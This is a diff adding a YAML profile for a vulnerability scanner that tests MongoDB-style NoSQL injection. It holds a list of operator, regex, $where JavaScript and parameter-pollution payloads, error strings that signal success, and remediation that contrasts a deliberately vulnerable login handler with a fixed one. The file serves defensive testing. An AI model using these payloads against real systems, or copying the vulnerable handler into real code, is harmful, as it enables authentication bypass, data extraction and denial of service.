@@ -1,0 +1,128 @@
+# NoSQL Injection Attack Profile
+# This file defines payloads for testing NoSQL injection vulnerabilities
+# Primarily targeting MongoDB and other document-oriented databases
+
+name: "NoSQL Injection"
+category: "injection"
+severity: "critical"
+description: "Tests for NoSQL injection vulnerabilities where user input is unsafely used in database queries, potentially leading to unauthorized access, data leakage, or denial of service."
+
+# Fields commonly vulnerable to NoSQL injection
+target_fields:
+  - "username"
+  - "password"
+  - "email"
+  - "search"
+  - "filter"
+  - "query"
+  - "id"
+  - "user_id"
+  - "token"
+  - "session"
+  - "key"
+
+# Attack payloads to test
+payloads:
+  # Operator Injection (Authentication Bypass & Logic Manipulation)
+  - '{"$ne": null}'
+  - '{"$ne": ""}'
+  - '{"$gt": ""}'
+  - '{"$gte": ""}'
+  - '{"$lt": "z"}'
+  - '{"$exists": true}'
+  - '{"$nin": []}'
+  - '{"$in": ["admin", "root", "administrator"]}'
+  - '{"$or": [{}, {"username": "admin"}]}'
+  - '{"$not": {"$type": 10}}'
+  - '{"$gt": 0}'
+  - '{"$ne": -1}'
+
+  # Regex Injection (Data Extraction & Blind Injection)
+  - '{"$regex": ".*"}'
+  - '{"$regex": "^admin"}'
+  - '{"$regex": "admin", "$options": "i"}'
+  - '{"$regex": "^[a-z]"}'
+  - '{"$regex": ".*@.*"}'
+  - '{"$regex": "^.{0,3}$"}'
+
+  # JavaScript Injection ($where / Server-Side JS)
+  - "'; return true; //"
+  - "'; return true; var x='"
+  - "' || '1'=='1"
+  - "' || 1==1 //"
+  - "'; while(true){}; //"
+  - '{"$where": "return true"}'
+  - '{"$where": "this.username == \"admin\""}'
+  - '{"$where": "this.password.length > 0"}'
+  - '{"$where": "sleep(5000)"}'
+  - "1; return true"
+  
+  # Type Juggling & Structure Injection (Parameter Pollution)
+  - '{"user": {"$ne": null}}'
+  - '[]'
+  - 'true'
+  - '{"$or": [{"a": "a"}, {"b": "b"}]}'
+
+  # Query String / Form Data Specific
+  - '[$ne]=1'
+  - '[$gt]='
+
+# Indicators that suggest successful injection
+success_indicators:
+  response_contains:
+    - "MongoError"
+    - "mongo"
+    - "MongoDB"
+    - "E11000"
+    - "WriteError"
+    - "CastError"
+    - "failed to parse"
+    - "Object representing the BSON type"
+    - "unterminated string literal"
+    - "$where"
+    - "$regex"
+    - "unexpected token"
+    - "Illegal character"
+    - "SyntaxError"
+    - "bad sort specification"
+    - "ReferenceError"
+  status_codes:
+    - 500
+    - 200 # Auth bypass might return 200 OK
+  response_time_gt: 5  # seconds (for time-based detection)
+
+# How to fix this vulnerability
+remediation: |
+  Sanitize user input and enforce strict type checking. 
+  Avoid passing user input directly to database queries.
+  When using libraries like Mongoose or PyMongo, ensure inputs are cast to their expected primitive types (e.g., strings) before use.
+  
+  Example (Node.js with Mongoose):
+  
+  // ❌ BAD - Vulnerable if req.body.username is an object like { "$ne": null }
+  app.post('/login', async (req, res) => {
+    const user = await User.findOne({ 
+      username: req.body.username, 
+      password: req.body.password 
+    });
+  });
+  
+  // ✅ GOOD - Force input to be a string
+  app.post('/login', async (req, res) => {
+    const username = req.body.username ? String(req.body.username) : '';
+    const password = req.body.password ? String(req.body.password) : '';
+    const user = await User.findOne({ username, password });
+  });
+
+  Example (Python with PyMongo):
+  
+  # ❌ BAD
+  db.users.find_one({"username": request.json.get('username')})
+  
+  # ✅ GOOD
+  username = str(request.json.get('username', ''))
+  db.users.find_one({"username": username})
+
+references:
+  - "OWASP Testing Guide: NoSQL Injection"
+  - "CWE-943: Improper Neutralization of Special Elements in Data Query Logic"
